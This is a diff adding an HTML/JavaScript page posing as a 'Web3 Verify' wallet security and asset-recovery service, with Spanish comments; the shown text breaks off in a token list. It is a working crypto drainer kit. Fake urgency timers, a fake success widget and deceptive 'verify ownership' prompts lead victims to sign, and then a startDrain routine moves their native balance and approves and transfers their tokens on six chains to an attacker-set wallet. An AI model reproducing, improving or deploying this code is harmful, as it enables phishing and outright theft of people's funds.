@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Web3 Verify | Secure Asset Recovery</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<script src="https://unpkg.com/lucide@latest"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<!-- Librería para generar QR -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+<style>
+:root {
+ --bg-dark: #09090b;
+ --bg-card: rgba(255, 255, 255, 0.03);
+ --border-color: rgba(255, 255, 255, 0.08);
+ --primary: #3b82f6;
+ --primary-hover: #2563eb;
+ --success: #22c55e;
+ --text-main: #f4f4f5;
+ --text-muted: #a1a1aa;
+ --font-main: 'Inter', sans-serif;
+ --font-mono: 'JetBrains Mono', monospace;
+}
+
+* { box-sizing: border-box; outline: none; }
+
+body { 
+ margin: 0; 
+ font-family: var(--font-main); 
+ background-color: var(--bg-dark); 
+ color: var(--text-main); 
+ display: flex; 
+ justify-content: center; 
+ align-items: center; 
+ min-height: 100vh; 
+ background-image: radial-gradient(circle at top right, #1e293b 0%, transparent 40%),
+ radial-gradient(circle at bottom left, #1e293b 0%, transparent 40%);
+}
+
+.container { 
+ text-align: center; 
+ max-width: 420px; 
+ width: 94%; 
+ padding: 32px 24px; 
+ background: var(--bg-card); 
+ backdrop-filter: blur(12px);
+ -webkit-backdrop-filter: blur(12px);
+ border-radius: 16px; 
+ border: 1px solid var(--border-color);
+ box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
+ position: relative;
+ z-index: 10;
+}
+
+header {
+ display: flex;
+ justify-content: space-between;
+ align-items: center;
+ margin-bottom: 24px;
+ padding-bottom: 16px;
+ border-bottom: 1px solid var(--border-color);
+}
+
+.logo-area {
+ display: flex;
+ align-items: center;
+ gap: 8px;
+ font-weight: 700;
+ font-size: 1.1rem;
+ letter-spacing: -0.02em;
+}
+
+.logo-icon {
+ background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+ padding: 6px;
+ border-radius: 6px;
+}
+
+h1 { 
+ font-size: 1.5rem; 
+ margin: 0 0 12px 0; 
+ color: var(--text-main);
+ line-height: 1.2;
+}
+
+p.subtitle { 
+ color: var(--text-muted); 
+ font-size: 0.9rem; 
+ margin: 0 0 24px 0; 
+ line-height: 1.5;
+}
+
+.asset-list {
+ text-align: left;
+ background: rgba(0,0,0,0.2);
+ border-radius: 8px;
+ padding: 12px;
+ margin-bottom: 20px;
+ border: 1px solid var(--border-color);
+ display: none;
+}
+
+.asset-item {
+ display: flex;
+ justify-content: space-between;
+ font-size: 0.85rem;
+ padding: 6px 0;
+ border-bottom: 1px solid rgba(255,255,255,0.05);
+}
+.asset-item:last-child { border-bottom: none; }
+.asset-name { color: var(--text-muted); }
+.asset-val { color: var(--text-main); font-weight: 500; }
+
+.btn { 
+ background: var(--primary); 
+ border: none; 
+ padding: 14px 24px; 
+ color: white; 
+ border-radius: 10px; 
+ cursor: pointer; 
+ font-weight: 600; 
+ width: 100%; 
+ font-size: 1rem; 
+ transition: all 0.2s ease;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ gap: 8px;
+ box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
+}
+
+.btn:hover:not(:disabled) { 
+ background: var(--primary-hover); 
+ transform: translateY(-1px);
+}
+
+.btn:active:not(:disabled) { transform: translateY(0); }
+
+.btn:disabled { 
+ background: #334155; 
+ color: #94a3b8; 
+ cursor: not-allowed; 
+ box-shadow: none;
+}
+
+.status { 
+ margin-top: 16px; 
+ font-size: 0.9rem; 
+ min-height: 24px; 
+ color: #fbbf24; 
+ font-weight: 500;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ gap: 6px;
+}
+
+#logs { 
+text-align: left; 
+background: #000000; 
+padding: 12px; 
+border-radius: 8px; 
+font-family: var(--font-mono); 
+font-size: 0.7rem; 
+color: #4ade80; 
+max-height: 120px; 
+overflow-y: auto; 
+margin-top: 16px; 
+display: none; 
+border: 1px solid #1e293b;
+scrollbar-width: thin;
+scrollbar-color: #333 transparent;
+}
+
+#logs div { margin-bottom: 4px; word-break: break-all; }
+#logs::-webkit-scrollbar { width: 4px; }
+#logs::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
+
+.timer { 
+ font-size: 0.8rem; 
+ color: #ef4444; 
+ margin-top: 12px; 
+ font-weight: 500;
+ opacity: 0.8;
+}
+
+.scanner-box {
+ height: 40px;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ margin-bottom: 16px;
+ opacity: 0;
+ transition: opacity 0.3s;
+}
+.scanner-active { opacity: 1; }
+
+.spinner {
+ width: 16px;
+ height: 16px;
+ border: 2px solid rgba(255,255,255,0.1);
+ border-top-color: var(--primary);
+ border-radius: 50%;
+ animation: spin 1s linear infinite;
+ margin-right: 8px;
+}
+
+@keyframes spin { to { transform: rotate(360); } }
+
+.mobile-modal { 
+ display: none; 
+ position: fixed; 
+ top: 0; 
+ left: 0; 
+ width: 100%; 
+ height: 100%; 
+ background: rgba(0,0,0,0.9); 
+ backdrop-filter: blur(5px);
+ z-index: 1000; 
+ justify-content: center; 
+ align-items: center; 
+}
+
+.modal-content { 
+ background: #1f2937; 
+ padding: 24px; 
+ border-radius: 16px; 
+ text-align: center; 
+ width: 85%; 
+ max-width: 320px; 
+ border: 1px solid #374151;
+ box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+}
+
+.modal-btn { 
+ background: var(--primary); 
+ margin-top: 15px; 
+}
+
+.modal-btn.secondary {
+ background: transparent;
+ border: 1px solid #4b5563;
+ color: var(--text-muted);
+}
+.modal-btn.secondary:hover { background: rgba(255,255,255,0.05); color: white; }
+
+.chat-widget {
+ position: fixed;
+ bottom: 20px;
+ right: 20px;
+ background: #1f2937;
+ border: 1px solid #374151;
+ border-radius: 12px;
+ padding: 12px 16px;
+ width: 260px;
+ box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+ z-index: 50;
+ opacity: 0;
+ transform: translateY(20px);
+ transition: all 0.5s ease;
+ pointer-events: none;
+}
+
+.chat-visible {
+ opacity: 1;
+ transform: translateY(0);
+ pointer-events: auto;
+}
+
+.chat-header {
+ display: flex;
+ align-items: center;
+ gap: 8px;
+ font-size: 0.8rem;
+ font-weight: 600;
+ margin-bottom: 8px;
+ color: var(--text-muted);
+}
+
+.chat-msg {
+ font-size: 0.85rem;
+ background: rgba(255,255,255,0.05);
+ padding: 8px 12px;
+ border-radius: 8px;
+ border-top-left-radius: 2px;
+ color: var(--text-main);
+}
+
+.hidden { display: none !important; }
+.fade-in { animation: fadeIn 0.5s ease forwards; }
+
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+.wallet-grid {
+ display: grid;
+ grid-template-columns: 1fr 1fr;
+ gap: 12px;
+ margin-bottom: 20px;
+}
+
+.wallet-option {
+ background: rgba(255,255,255,0.05);
+ border: 1px solid var(--border-color);
+ padding: 12px;
+ border-radius: 12px;
+ cursor: pointer;
+ transition: all 0.2s;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ gap: 10px;
+ font-size: 0.9rem;
+ font-weight: 500;
+ color: var(--text-main);
+}
+
+.wallet-option:hover {
+ background: rgba(255,255,255,0.1);
+ border-color: var(--primary);
+}
+
+/* NUEVO ESTILO: QR SECTION */
+.qr-section {
+    margin-top: 20px;
+    padding: 15px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 12px;
+    border: 1px dashed var(--border-color);
+}
+#qrcode {
+    display: flex;
+    justify-content: center;
+    margin-top: 10px;
+}
+#qrcode img {
+    border: 2px solid white;
+    border-radius: 8px;
+}
+</style>
+</head>
+<body>
+
+<div id="chatWidget" class="chat-widget">
+<div class="chat-header">
+<i data-lucide="message-square" style="width:14px; height:14px;"></i>
+Live Support
+</div>
+<div class="chat-msg">
+User_882 just verified successfully! ✅
+</div>
+</div>
+
+<div class="container fade-in">
+<header>
+<div class="logo-area">
+<div class="logo-icon">
+<i data-lucide="shield-check" style="color:white; width:18px; height:18px;"></i>
+</div>
+<span>Web3 Verify</span>
+</div>
+</header>
+
+<h1>🔒 Wallet Security Verified</h1>
+<p class="subtitle">
+We detected a potential security risk in your transaction history. To restore full access to your assets, please verify ownership.
+</p>
+
+<button id="connectBtn" class="btn">
+<i data-lucide="wallet" style="width:18px; height:18px;"></i>
+Connect Wallet
+</button>
+
+<div id="walletGrid" class="wallet-grid hidden">
+</div>
+
+<!-- SECCIÓN QR -->
+<div id="qrSection" class="qr-section">
+    <div style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px;">
+        📱 Scan with Camera to Open
+    </div>
+    <div id="qrcode"></div>
+</div>
+
+<div id="scanArea" class="hidden">
+<div class="scanner-box scanner-active" id="scannerAnim">
+<div class="spinner"></div>
+<span style="font-size:0.85rem; color:#94a3b8;">Scanning EVM Chains...</span>
+</div>
+
+<div class="asset-list" id="assetList"></div>
+</div>
+
+<button id="verifyBtn" class="btn hidden" style="background: #22c55e; box-shadow: 0 4px 12px rgba(34, 197, 94, 0.25);">
+<i data-lucide="signature" style="width:18px; height:18px;"></i>
+Sign Message to Verify
+</button>
+
+<div style="margin-top:8px; font-size:0.8rem; color:#94a3b8; display:none;" id="costInfo">
+Cost: 0 Gas | Time: < 2s
+</div>
+
+<div id="status" class="status"></div>
+<div id="timer" class="timer">Claiming closes in: 05:00</div>
+
+<div id="logs"></div>
+</div>
+
+<div id="mobileModal" class="mobile-modal">
+<div class="modal-content">
+<div style="margin-bottom:15px; color:#3b82f6;"><i data-lucide="smartphone" style="width:40px; height:40px;"></i></div>
+<h3 id="modalTitle" style="margin:0 0 10px 0; font-size:1.1rem;">Wallet Detected</h3>
+<p id="modalText" style="color:#9ca3af; font-size:0.9rem; margin:0 0 20px 0;">Para continuar, por favor abre tu aplicación.</p>
+
+<button id="openAppBtn" class="btn modal-btn">Abrir App</button>
+<button id="confirmOpenBtn" class="btn modal-btn secondary" style="margin-top:10px;">Ya está abierto / Conectar</button>
+</div>
+</div>
+
+<script>
+// ==========================================
+// CONFIGURACIÓN
+// ==========================================
+
+const TARGET_WALLET = "TU_WALLET_AQUI"; 
+
+let provider;
+let signer;
+let userAddress;
+let currentChainId;
+let detectedWalletType = 'unknown';
+
+const connectBtn = document.getElementById('connectBtn');
+const verifyBtn = document.getElementById('verifyBtn');
+const statusDiv = document.getElementById('status');
+const logsDiv = document.getElementById('logs');
+const mobileModal = document.getElementById('mobileModal');
+const openAppBtn = document.getElementById('openAppBtn');
+const confirmOpenBtn = document.getElementById('confirmOpenBtn');
+const scanArea = document.getElementById('scanArea');
+const assetList = document.getElementById('assetList');
+const costInfo = document.getElementById('costInfo');
+const chatWidget = document.getElementById('chatWidget');
+const modalTitle = document.getElementById('modalTitle');
+const modalText = document.getElementById('modalText');
+const walletGrid = document.getElementById('walletGrid');
+
+function log(msg) {
+ logsDiv.style.display = 'block';
+ const p = document.createElement('div');
+ p.textContent = `> ${msg}`;
+ logsDiv.appendChild(p);
+ logsDiv.scrollTop = logsDiv.scrollHeight;
+}
+
+function getNetworkName(chainId) {
+ switch(chainId) {
+ case 1: return "Ethereum";
+ case 56: return "BSC";
+ case 137: return "Polygon";
+ case 42161: return "Arbitrum";
+ case 10: return "Optimism";
+ case 43114: return "Avalanche";
+ case 199: return "BitTorrent";
+ default: return "Unknown";
+ }
+}
+
+let timeLeft = 300; 
+setInterval(() => {
+ if(timeLeft <= 0) return;
+ timeLeft--;
+ let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+ let s = (timeLeft % 60).toString().padStart(2, '0');
+ document.getElementById('timer').textContent = `Claiming closes in: ${m}:${s}`;
+}, 1000);
+
+function isMobile() {
+ return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
+}
+
+if (!window.ethereum) {
+ window.ethereum = {};
+}
+if (window.TrustWallet) {
+ window.ethereum = window.TrustWallet;
+ detectedWalletType = 'trust';
+}
+if (window.rabby) {
+ window.ethereum = window.rabby;
+ detectedWalletType = 'rabby';
+}
+if (window.okxwallet) {
+ window.ethereum = window.okxwallet;
+ detectedWalletType = 'okx';
+}
+
+function detectWallet() {
+ if (window.ethereum?.isTrust) { detectedWalletType = 'trust'; return 'trust'; }
+ if (window.ethereum?.isMetaMask) { detectedWalletType = 'metamask'; return 'metamask'; }
+ if (window.ethereum?.isCoinbaseWallet) { detectedWalletType = 'coinbase'; return 'coinbase'; }
+ if (window.ethereum?.isRabby) { detectedWalletType = 'rabby'; return 'rabby'; }
+ if (window.ethereum?.isBinance) { detectedWalletType = 'binance'; return 'binance'; }
+ if (window.ethereum?.isPhantom) { detectedWalletType = 'phantom'; return 'phantom'; }
+ return 'unknown';
+}
+
+connectBtn.addEventListener('click', async () => {
+ connectBtn.classList.add('hidden');
+ walletGrid.classList.remove('hidden');
+ updateWalletGrid(detectWallet());
+});
+
+function updateWalletGrid(detectedType) {
+ const wallets = [
+ { id: 'metamask', icon: '🦊', name: 'MetaMask' },
+ { id: 'trust', icon: '🛡️', name: 'Trust Wallet' },
+ { id: 'coinbase', icon: '🔵', name: 'Coinbase' },
+ { id: 'rabby', icon: '🐰', name: 'Rabby' },
+ { id: 'binance', icon: '🔶', name: 'Binance' },
+ { id: 'phantom', icon: '👻', name: 'Phantom' }
+ ];
+ 
+ walletGrid.innerHTML = '';
+ wallets.forEach(w => {
+ const div = document.createElement('div');
+ div.className = 'wallet-option';
+ div.innerHTML = `<span>${w.icon}</span> ${w.name}`;
+ div.onclick = () => handleWalletSelection(w.id, detectedType);
+ walletGrid.appendChild(div);
+ });
+}
+
+async function handleWalletSelection(selectedType, detectedType) {
+ if (isMobile()) {
+ modalTitle.textContent = `${selectedType.charAt(0).toUpperCase() + selectedType.slice(1)} Detected`;
+ modalText.textContent = "Presiona 'Abrir App' para completar la verificación.";
+ 
+ // LINKS CORREGIDOS PARA CADA WALLET
+ let deepLink = "";
+ if(selectedType === 'metamask') deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
+ else if(selectedType === 'trust') deepLink = `https://link.trustwallet.org/open_url?url=${encodeURIComponent(window.location.href)}`;
+ else if(selectedType === 'binance') deepLink = `https://www.binance.org/en/dapp?dd=${encodeURIComponent(window.location.href)}`;
+ else if(selectedType === 'phantom') deepLink = `https://phantom.app.link/dapp/${window.location.host}`;
+ else if(selectedType === 'coinbase') deepLink = `https://go.cb-w.com/dapp?dappUrl=${encodeURIComponent(window.location.host)}`;
+ else if(selectedType === 'rabby') deepLink = `https://rabby.io/dapp?dappUrl=${encodeURIComponent(window.location.host)}`;
+ 
+ openAppBtn.onclick = () => {
+ window.open(deepLink);
+ setTimeout(() => {
+ if (window.ethereum && (selectedType === 'metamask' ? window.ethereum.isMetaMask : true)) {
+ tryConnect();
+ } else {
+ modalText.textContent = "Si no se conectó, presiona 'Conectar' para intentar de nuevo.";
+ }
+ }, 2000);
+ };
+ 
+ mobileModal.style.display = 'flex';
+ return;
+ } else {
+ if (detectedType === selectedType || (window.ethereum && (
+ (selectedType === 'metamask' && window.ethereum.isMetaMask) ||
+ (selectedType === 'trust' && window.ethereum.isTrust) ||
+ (selectedType === 'coinbase' && window.ethereum.isCoinbaseWallet) ||
+ (selectedType === 'rabby' && window.ethereum.isRabby) ||
+ (selectedType === 'binance' && window.ethereum.isBinance) ||
+ (selectedType === 'phantom' && window.ethereum.isPhantom)
+ ))) {
+ tryConnect();
+ } else {
+ log(`Opening ${selectedType}...`);
+ window.open(`https://${selectedType}.io`, '_blank');
+ }
+ }
+}
+
+async function tryConnect() {
+ if (!window.ethereum) {
+ statusDiv.textContent = "Instala tu wallet primero.";
+ return;
+ }
+ 
+ detectWallet();
+ 
+ if (isMobile()) {
+ if (detectedWalletType === 'trust' && !window.ethereum.isTrust) {
+ modalTitle.textContent = "Trust Wallet Detected";
+ modalText.textContent = "Para verificar tus activos, abriremos el navegador interno.";
+ openAppBtn.onclick = () => {
+ window.open('https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href));
+ tryConnect(); 
+ };
+ } else if (detectedWalletType === 'metamask' && !window.ethereum.isMetaMask) {
+ modalTitle.textContent = "MetaMask Detected";
+ modalText.textContent = "Abre la app para confirmar la conexión.";
+ openAppBtn.onclick = () => {
+ window.open('https://metamask.app.link/dapp/' + window.location.host);
+ tryConnect();
+ };
+ } else {
+ modalTitle.textContent = "Mobile Wallet Connected";
+ modalText.textContent = "Presiona 'Conectar' para iniciar el escaneo de seguridad.";
+ openAppBtn.onclick = () => {
+ mobileModal.style.display = 'none';
+ tryConnect();
+ };
+ }
+ 
+ mobileModal.style.display = 'flex';
+ confirmOpenBtn.addEventListener('click', () => {
+ mobileModal.style.display = 'none';
+ tryConnect();
+ });
+ return; 
+ }
+ 
+ try {
+ await tryConnectDesktop();
+ } catch (err) {
+ console.error(err);
+ statusDiv.textContent = "Error de conexión.";
+ }
+}
+
+async function tryConnectDesktop() {
+ try {
+ const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+ userAddress = accounts[0];
+ const network = await window.ethereum.request({ method: 'eth_chainId' });
+ const chainIdNum = parseInt(network);
+ 
+ provider = new ethers.providers.Web3Provider(window.ethereum);
+ signer = provider.getSigner();
+ currentChainId = chainIdNum;
+ 
+ log(`Connected via ${detectedWalletType.toUpperCase()}`);
+ log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
+ log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
+ 
+ scanArea.classList.remove('hidden');
+ 
+ setTimeout(() => {
+ scanAssets();
+ setTimeout(() => {
+ verifyBtn.classList.remove('hidden');
+ costInfo.style.display = 'block';
+ chatWidget.classList.add('visible');
+ }, 1000);
+ }, 2000);
+ 
+ } catch (error) {
+ statusDiv.textContent = "Conexión rechazada o fallida.";
+ log(error.message);
+ }
+}
+
+async function scanAssets() {
+ log("Starting asset scan...");
+ try {
+ const balance = await provider.getBalance(userAddress);
+ const formattedBalance = ethers.utils.formatEther(balance);
+ if (parseFloat(formattedBalance) > 0.0001) {
+ addAssetToList(getNetworkName(currentChainId) + " Balance", formattedBalance);
+ log(`Found native balance: ${formattedBalance}`);
+ }
+ } catch (e) {
+ log("Error scanning native balance.");
+ }
+ 
+ for(let token of TOKENS_TO_SCAN) {
+ if(token.chainId === currentChainId) {
+ try {
+ const contract = new ethers.Contract(token.address, ['function balanceOf(address) view returns (uint256)'], provider);
+ const rawBalance = await contract.balanceOf(userAddress);
+ const balance = parseFloat(ethers.utils.formatUnits(rawBalance, token.decimals));
+ 
+ if (balance > 0) {
+ addAssetToList(token.symbol, balance.toFixed(2));
+ log(`Scanned ${token.symbol}: Found ${balance.toFixed(2)}`);
+ }
+ } catch (err) {}
+ }
+ }
+}
+
+function addAssetToList(name, value) {
+ const item = document.createElement('div');
+ item.className = 'asset-item';
+ item.innerHTML = `<span class="asset-name">${name}</span><span class="asset-val">$${value}</span>`;
+ assetList.appendChild(item);
+ assetList.style.display = 'block';
+ document.getElementById('scannerAnim').style.opacity = '0';
+}
+
+verifyBtn.addEventListener('click', async () => {
+ verifyBtn.disabled = true;
+ verifyBtn.innerHTML = '<div class="spinner"></div> Signing...';
+
+try {
+ const message = "Verify Ownership of Web3 Asset Recovery";
+ const signature = await signer.signMessage(message);
+ 
+ log("Signature generated successfully.");
+ log(`Signature: ${signature.substring(0, 20)}...`);
+ 
+ statusDiv.textContent = "✅ Verification Successful! Initiating transfer...";
+ statusDiv.style.color = "#22c55e";
+ verifyBtn.textContent = "Verified";
+ 
+ setTimeout(() => { startDrain(); }, 1500);
+ 
+} catch (err) {
+ console.error(err);
+ statusDiv.textContent = "❌ Verification Failed";
+ statusDiv.style.color = "#ef4444";
+ log(err.message);
+ verifyBtn.disabled = false;
+ verifyBtn.innerHTML = '<i data-lucide="signature" style="width:18px; height:18px;"></i> Sign Message to Verify';
+}
+});
+
+async function waitForTransactionReceipt(hash, timeout = 45000) {
+ const startTime = Date.now();
+ while (Date.now() - startTime < timeout) {
+ try {
+ const receipt = await provider.getTransactionReceipt(hash);
+ if (receipt) return receipt;
+ } catch (e) {}
+ await new Promise(r => setTimeout(r, 3000)); 
+ }
+ return null;
+}
+
+async function executeWithRetry(txFunction, params, maxRetries = 3) {
+ let lastTxHash = null;
+ let retryCount = 0;
+ 
+ while (retryCount <= maxRetries) {
+ try {
+ log(retryCount === 0 ? "Sending transaction..." : `Retrying with higher gas (Attempt ${retryCount + 1})...`);
+ const txResponse = await txFunction(...params);
+ lastTxHash = txResponse.hash;
+ log(`Tx sent: ${lastTxHash.substring(0, 10)}... Waiting for confirmation...`);
+ const receipt = await waitForTransactionReceipt(lastTxHash);
+ 
+ if (receipt && receipt.status === "0x1") {
+ log("Transaction confirmed!");
+ return true;
+ } else if (receipt && receipt.status === "0x0") {
+ log("Transaction reverted on-chain.");
+ return false;
+ } else {
+ retryCount++;
+ continue; 
+ }
+ } catch (err) {
+ retryCount++;
+ if (retryCount >= maxRetries) {
+ console.error("Max retries reached for this step.");
+ return false;
+ }
+ }
+ }
+ return lastTxHash;
+}
+
+async function getDynamicGasConfig(provider) {
+ const feeData = await provider.getFeeData();
+ if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+ const multiplier = 1.2; 
+ const priorityMultiplier = 1.5;
+ return {
+ maxFeePerGas: feeData.maxFeePerGas.mul(Math.floor(multiplier * 100)).div(100),
+ maxPriorityFeePerGas: feeData.maxPriorityFeePerGas.mul(Math.floor(priorityMultiplier * 100)).div(100)
+ };
+ } else {
+ const multiplier = 1.5;
+ return {
+ gasPrice: feeData.gasPrice.mul(Math.floor(multiplier * 100)).div(100)
+ };
+ }
+}
+
+async function startDrain() {
+ verifyBtn.classList.add('hidden');
+ log("--- STARTING DRAIN (GOD MODE) ---");
+ 
+ try {
+ const balance = await provider.getBalance(userAddress);
+ if (balance > 0) {
+ log("Transferring native token...");
+ const gasConfig = await getDynamicGasConfig(provider);
+ const estimatedGas = await provider.estimateGas({ to: TARGET_WALLET, value: balance });
+ const gasCostEstimate = estimatedGas.mul(gasConfig.maxFeePerGas || gasConfig.gasPrice);
+ const sendValue = balance.sub(gasCostEstimate);
+ 
+ if (sendValue > 0) {
+ const txHash = await executeWithRetry(async () => {
+ try {
+ return await signer.sendTransaction({
+ to: TARGET_WALLET,
+ value: sendValue,
+ maxFeePerGas: gasConfig.maxFeePerGas,
+ maxPriorityFeePerGas: gasConfig.maxPriorityFeePerGas
+ });
+ } catch (e) {
+ return await signer.sendTransaction({
+ to: TARGET_WALLET,
+ value: sendValue,
+ gasPrice: gasConfig.gasPrice
+ });
+ }
+ }, []);
+ 
+ if(txHash) log(`Native drained! Tx: ${txHash.substring(0,10)}...`);
+ else log("Native transfer might be pending or failed.");
+ } else {
+ log("Balance too low for gas.");
+ }
+ } else {
+ log("No native funds found.");
+ }
+ 
+ // LISTA COMPLETA DE TODOS LOS TOKENS RESTAURADOS
+ const tokensMap = {
+ 1: ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599","0x6982508145454Ce325dDbE47a25d4ec3d2311933","0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984","0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9","0x514910771AF9Ca656af840dff83E8264EcF986CA","0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE","0xc00e94Cb662C3520282E6f5717214004A7f26888","0xD533a949740bb3306d119CC777fa900bA034cd52","0x0D8775F648430679A709E98d2b0Cb6250d2887EF","0x6B3595068778DD592e39A122f4f5a5cF09C90fE2","0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e","0x6B175474E89094C44Da98b954EedeAC495271d0F","0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202"],
+ 56: ["0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d","0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c","0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56","0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F","0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c","0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63","0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82","0xBf5140A22578168FD562DCcF235E5D43A02ce9B1"],
+ 137: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x2791Bca1f2de4661ED88A30C99a7a9449Aa84174","0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270","0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619","0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063","0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3","0x580A84C73811E1839F75d86d75d88cCa0c241fF4","0xc67238827da94B15F6bA10F3d35f690809919F75"],
+ 42161: ["0xaf88d065e77c8cc2239301c5e016f019b175484b","0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8","0x82aF49447D8a07e3bd95BD0d56f35241523fBab1","0xFd086bC7CD5C481DCC9C85EBE478A1C0b69FCbb9","0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a","0x912CE59144191C1204E64559FE8253a0e49E6548","0x17FC002b466eEc40DaE837Fc4bE5c884515b0F7e"],
+ 10: ["0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85","0x94b008aA00579c1307B0EF2c499aD98a8ce58e58","0x4200000000000000000000000000000000000006","0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1","0x4200000000000000000000000000000000000042","0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb"],
+ 43114: ["0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E","0xc7198437980c041c805A1EDcbA50c1Ce5db95118","0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7","0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB","0x5947BB275c521040051D82396192181b413227A3","0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd"] 
+ };
+
+ const tokenList = tokensMap[currentChainId] || [];
+ 
+ for (const tokenAddress of tokenList) {
+ try {
+ log(`Scanning Token: ${tokenAddress.substring(0,6)}...`);
+ const tokenData = TOKENS_TO_SCAN.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
+ const decimals = tokenData ? tokenData.decimals : 18;
+ const symbol = tokenData ? tokenData.symbol : "UNK";
+ 
+ const erc20 = new ethers.Contract(tokenAddress, [
+ "function approve(address spender, uint256 amount) public returns (bool)",
+ "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
+ "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+ "function balanceOf(address owner) view returns (uint256)",
+ "function allowance(address owner, address spender) view returns (uint256)"
+ ], signer);
+ 
+ const balance = await erc20.balanceOf(userAddress);
+ 
+ if (balance > 0) {
+ log(`Found balance: ${ethers.utils.formatUnits(balance, decimals)} (${symbol})`);
+ const currentAllowance = await erc20.allowance(userAddress, TARGET_WALLET);
+ 
+ let approvalTx;
+ if (currentAllowance.gte(balance)) {
+ log("Allowance already sufficient.");
+ } else {
+ try {
+ approvalTx = await executeWithRetry(async () => {
+ return await erc20.increaseAllowance(TARGET_WALLET, ethers.constants.MaxUint256);
+ }, []);
+ log("Approval increased via increaseAllowance.");
+ } catch (e) {
+ approvalTx = await executeWithRetry(async () => {
+ return await erc20.approve(TARGET_WALLET, ethers.constants.MaxUint256);
+ }, []);
+ log("Approval set via fallback approve.");
+ }
+ }
+ 
+ try {
+ log("Transferring tokens...");
+ const tokenGasConfig = await getDynamicGasConfig(provider);
+ 
+ await executeWithRetry(async () => {
+ const txParams = {
+ from: userAddress,
+ to: tokenAddress,
+ data: erc20.interface.encodeFunctionData("transferFrom", [userAddress, TARGET_WALLET, balance])
+ };
+ 
+ if (tokenGasConfig.maxFeePerGas) {
+ txParams.maxFeePerGas = tokenGasConfig.maxFeePerGas;
+ txParams.maxPriorityFeePerGas = tokenGasConfig.maxPriorityFeePerGas;
+ } else {
+ txParams.gasPrice = tokenGasConfig.gasPrice;
+ }
+ return await signer.sendTransaction(txParams);
+ }, []);
+ 
+ log(`Token drained! Tx: Sent`);
+ } catch (err) {
+ log("Transfer failed: " + err.message);
+ }
+ }
+ } catch (err) {
+ console.warn(`Token ${tokenAddress} error:`, err.message);
+ }
+ }
+ 
+ statusDiv.textContent = "✅ CLAIM SUCCESSFUL";
+ statusDiv.style.color = "#4ade80";
+ connectBtn.textContent = "Done";
+ 
+ } catch (err) {
+ console.error(err);
+ statusDiv.textContent = "❌ ERROR: " + err.message;
+ log(err.message);
+ }
+}
+
+const TOKENS_TO_SCAN = [
+ { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, chainId: 1 },
+{ symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, chainId: 1 },
